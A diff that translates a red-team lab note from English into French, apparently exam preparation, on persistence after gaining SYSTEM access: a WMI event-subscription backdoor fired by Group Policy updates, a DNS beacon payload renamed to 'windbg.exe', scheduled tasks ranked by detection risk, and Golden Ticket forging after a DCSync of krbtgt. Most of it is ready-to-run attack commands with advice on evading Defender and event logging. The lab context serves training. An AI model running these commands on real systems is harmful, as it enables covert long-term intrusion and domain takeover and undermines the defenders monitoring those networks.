@@ -1,19 +1,19 @@
-# Elevated Persistence Lab
+# Lab — Elevated Persistence
 
-> **Methodology context:** This is **Phase 7 — Elevated Persistence**. Deploy after you have a SYSTEM beacon (from Phase 6 Privilege Escalation). This is your second persistence layer — if the user-level COM hijack (Phase 4) is cleaned up by Blue Team, this WMI subscription brings you back without requiring a user to log in.
+> **Contexte méthodologique :** il s’agit de la **phase 7 — Elevated Persistence**, après l’obtention d’un Beacon SYSTEM (phase 6, Privilege Escalation). Cette deuxième couche de persistence permet de retrouver un accès via une subscription WMI si la Blue Team supprime le COM hijack utilisateur (phase 4).
 
-> **Why DNS beacon, not HTTP:**
-> - DNS C2 traffic blends with normal DNS queries — harder to block without disrupting the network
-> - HTTP listener may be rate-limited or inspected on port 80; DNS is rarely firewalled internally
-> - The WMI trigger runs as SYSTEM in a headless context (no user session) — DNS survives where HTTP might fail in restricted environments
-> - Exam pattern: DNS for elevated/SYSTEM persistence, HTTP/SMB for interactive beacons
+> **Pourquoi un DNS Beacon plutôt qu’un HTTP Beacon ?**
+> - Le trafic DNS C2 se mélange aux requêtes DNS habituelles, compliquant son blocage sans perturber le réseau
+> - Un HTTP listener peut être limité ou inspecté sur le port 80 ; DNS est souvent moins filtré en interne
+> - Le déclencheur WMI s’exécute en SYSTEM sans session utilisateur ; DNS peut rester accessible lorsque HTTP est bloqué
+> - Dans ce lab : DNS pour Elevated Persistence/SYSTEM, HTTP/SMB pour les Beacons interactifs
 
 ----
 
-## WmiPersistence.ps1 — WMI GPO Event Subscription  
+## WmiPersistence.ps1 — Subscription WMI sur événement GPO  
 
-1. Create new file `C:\Tools\WmiPersistence.ps1`  
-2. Paste code below  
+1. Créer le fichier `C:\Tools\WmiPersistence.ps1`  
+2. Coller le code ci-dessous  
 
 ```powershell
 function Add-WmiPersistence
@@ -47,45 +47,45 @@ function Remove-WmiPersistence
 }
 ```
 
->This will trigger when the computer updates its Group Policy Objects.  
-3. Generate a DNS payload.  
+>L’action est déclenchée à la mise à jour des Group Policy Objects (GPO).  
+3. Générer un payload DNS.  
 ```
 Payloads > Windows Stageless Payload
 Listener: dns
 Click Generate
 Save to C:\Payloads\dns_x64.exe
 ```
-4. Interact with the SYSTEM Beacon.  
-5. Upload the payload.
+4. Interagir avec le Beacon SYSTEM.  
+5. Uploader le payload.
 ```
 upload C:\Payloads\dns_x64.exe
 mv dns_x64.exe windbg.exe
 ```
-6. Install the backdoor (using self-injection).  
+6. Installer la backdoor par self-injection.  
 ```
 powershell-import C:\Tools\WmiPersistence.ps1
 psinject [BEACON PID] x64 Add-WmiPersistence
 ```
-7. Trigger the backdoor (can be done in Beacon)
+7. Déclencher la backdoor depuis le Beacon
 ```
 execute gpupdate /target:computer /force
 ```
 
 ----  
 
-### Scheduled Task (Backup Persistence)
+### Scheduled Task — Persistence de secours
 
-| Risk | Command | Why |
+| Risque | Commande | Explication |
 |------|---------|-----|
-| `OPSEC-CAUTION` ✅ | `powerpick Register-ScheduledTask -TaskName 'WindowsDebugHelper' -Action (New-ScheduledTaskAction -Execute 'C:\Windows\Temp\windbg.exe') -Trigger (New-ScheduledTaskTrigger -AtStartup) -RunLevel Highest -User 'SYSTEM' -Force` | No `powershell.exe`. Task XML written to disk (always — unavoidable), Event 4698 fires. |
-| `OPSEC-CAUTION` ✅ | `execute-assembly SharPersist.exe -t schtask -c "C:\Windows\Temp\windbg.exe" -n "WindowsDebugHelper" -m add -o logon` | Fork & run (spawnto process). Same Event 4698 detection as above but no `powershell.exe`. |
-| `OPSEC-UNSAFE` ❌ | `shell schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\windbg.exe" /sc onstart /ru SYSTEM /f` | Spawns `cmd.exe` + `schtasks.exe`. Command line logged by Defender kernel callbacks. |
+| `OPSEC-CAUTION` ✅ | `powerpick Register-ScheduledTask -TaskName 'WindowsDebugHelper' -Action (New-ScheduledTaskAction -Execute 'C:\Windows\Temp\windbg.exe') -Trigger (New-ScheduledTaskTrigger -AtStartup) -RunLevel Highest -User 'SYSTEM' -Force` | Pas de `powershell.exe`. Le XML de la task est écrit sur disque et l’événement 4698 est généré. |
+| `OPSEC-CAUTION` ✅ | `execute-assembly SharPersist.exe -t schtask -c "C:\Windows\Temp\windbg.exe" -n "WindowsDebugHelper" -m add -o logon` | Fork & run via `spawnto`. Même événement 4698, sans `powershell.exe`. |
+| `OPSEC-UNSAFE` ❌ | `shell schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\windbg.exe" /sc onstart /ru SYSTEM /f` | Crée `cmd.exe` et `schtasks.exe`. La ligne de commande est visible par les callbacks kernel de Defender. |
 
-> **Exam rule:** If the operation has a `powerpick` equivalent, always use `powerpick` over `shell`. If it has an `execute-assembly` equivalent, prefer that over `shell`. Only fall back to `shell` when there is genuinely no alternative — and flag it as UNSAFE in your documentation for the OPSEC scoring criteria.
+> **Règle d’examen :** privilégier `powerpick`, puis `execute-assembly` lorsqu’ils conviennent. Utiliser `shell` en dernier recours et signaler le risque OPSEC **UNSAFE**.
 
-### Golden Ticket — Best OPSEC Elevated Persistence (no binary on disk)
+### Golden Ticket — Persistence sans binaire sur disque
 
-Once you have the `krbtgt` AES256 hash from DCSync, you can forge DA-level Kerberos tickets at will — no binary on disk, no WMI subscription, no scheduled task:
+Une fois le hash AES256 de `krbtgt` récupéré avec DCSync, des tickets Kerberos Domain Admin peuvent être forgés sans binaire sur disque, subscription WMI ni Scheduled Task :
 
 ```cs
 // On attacker desktop (NOT in beacon — run locally)
@@ -97,9 +97,9 @@ beacon> run klist
 beacon> ls \\lon-dc-1\c$   // verify DA access
 ```
 
-> **Why this is the best persistence:** No process runs on target machines. No file written to target. Ticket lives in the attacker's memory only. Survives until `krbtgt` password is rotated (default 60 days; detection is DCSync event 4662 at collection time, not at use time).
+> **Intérêt de cette persistence :** pas de processus ni de fichier supplémentaire sur la cible. Le ticket reste en mémoire côté attaquant jusqu’à la rotation du mot de passe `krbtgt` (60 jours par défaut selon les notes d’origine). L’opération DCSync peut générer l’événement 4662 lors de la collecte.
 
-### Scheduled Task — Backup if WMI is Monitored
+### Scheduled Task — Alternative si WMI est surveillé
 
 ```cs
 // OPSEC-CAUTION — task XML written to C:\Windows\System32\Tasks\, Event 4698
@@ -112,6 +112,6 @@ beacon> powerpick Get-ScheduledTask -TaskName 'WindowsDebugHelper'
 beacon> powerpick Unregister-ScheduledTask -TaskName 'WindowsDebugHelper' -Confirm:$false
 ```
 
-> **Avoid `shell schtasks /create`** — spawns `cmd.exe` as child of beacon (OPSEC-UNSAFE). Always use `powerpick` with the `ScheduledTask` cmdlets.
+> **Éviter `shell schtasks /create`** : la commande crée un child process `cmd.exe` depuis le Beacon (**OPSEC-UNSAFE**). Privilégier les cmdlets `ScheduledTask` via `powerpick`.
 
 
